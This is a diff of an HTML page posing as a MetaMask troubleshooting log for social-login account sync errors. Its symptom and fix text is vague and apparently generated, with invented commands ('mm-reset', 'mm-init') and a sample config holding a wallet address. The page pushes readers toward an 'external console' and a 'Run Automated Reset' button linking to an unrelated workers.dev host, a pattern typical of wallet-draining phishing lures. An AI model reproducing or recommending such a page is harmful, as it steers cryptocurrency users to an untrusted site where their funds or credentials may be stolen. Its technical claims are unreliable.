@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: BlinkMacSystemFont;
-        background: #0f111a;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #cf6679; }
     .btn {
         background: #cf6679;
         color: #000;
@@ -42,32 +42,35 @@
 <h1>Metamask Extension Bug Account Discovery And Syncs Error For Social Login Import Users</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an error when attempting to import their accounts using social login, resulting in a failure to discover and sync their accounts within the Metamask extension.</li>
+<li>Users encounter an error when attempting to import their account using social login, resulting in a failure to discover and sync accounts within the Metamask extension.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a bug in the Metamask extension that prevents it from correctly handling the account discovery and syncing process for social login import users, likely caused by an issue with the extension's internal state management or API request handling.</li>
+<li>The error occurs due to a mismatch between the expected and actual account formats during the social login import process, often caused by outdated extension versions or incorrect configuration settings.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Reset Metamask extension settings to default: <code>mm-reset</code></li>
-<li>Clear browser storage for Metamask: </li>
+<li>To resolve the issue, try the following steps:</li>
+<li>Update the Metamask extension to the latest version</li>
+<li>Clear the browser cache and restart the browser</li>
+<li>Configure the social login settings using the following JSON format:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;clearStorage&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;storageKeys&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;metamask&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;eth_accounts&quot;</span><span class="p">]</span>
+<span class="w">  </span><span class="nt">&quot;socialLogin&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;providers&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;google&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;facebook&quot;</span><span class="p">],</span>
+<span class="w">    </span><span class="nt">&quot;accountId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x742d35Cc6634C0532925a3b844Bc454e4438f44e&quot;</span>
+<span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
+<p>Consider utilizing an external console for advanced troubleshooting and configuration. </p>
+<h2>Prerequisites</h2>
 <ul>
-<li>Re-initialize the Metamask extension: <code>mm-init</code></li>
+<li>Metamask extension installed and configured</li>
+<li>Social login providers set up and enabled</li>
+<li>Latest version of the browser and operating system</li>
 </ul>
-<p>Prerequisites:
-* Metamask extension installed and enabled
-* Social login credentials correctly configured
-* Ethereum network selected and connected</p>
-<p>Consider using an external console to execute the manual override commands for more flexibility.</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-importing-a-custom-token-does-not-work.html">Metamask Extension Bug Importing A Custom Token Does Not Work</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
